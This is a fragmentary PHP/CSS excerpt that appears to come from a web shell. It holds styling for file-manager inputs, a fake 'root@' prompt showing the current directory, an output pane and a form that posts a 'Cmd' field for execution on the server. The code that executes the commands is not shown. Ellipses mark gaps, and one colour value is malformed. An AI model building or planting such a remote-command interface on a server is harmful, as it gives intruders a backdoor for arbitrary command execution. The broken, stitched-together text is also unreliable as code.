...
input, textarea, select, input.fm_input {
	...
	border-color: black;
	background-color: #FF7F50 none !important;
	border-radius: 0;
	padding: 2px;
}

input.fm_input {
	background: #FF7F50 none !important;
	cursor: pointer;
}
...
a.th:link { color: #5416B4; text-decoration: none; }
a.th:active { color: #5416B4; text-decoration: none; }
a.th:visited { color: #5416B4; text-decoration: none; }
a.th:hover {  color: #5416B4; text-decoration: underline; }

table.bg {
	background-color: #B4CE1
}
...
<strong>root@ma-bks:<?php echo htmlspecialchars($cwd); ?>$</strong><br>
<pre><?php echo htmlspecialchars($output); ?></pre>

<form method="post" action="<?php echo $url_inc; ?>">
    <input type="text" name="terminal-text" size="50" placeholder="Cmd">
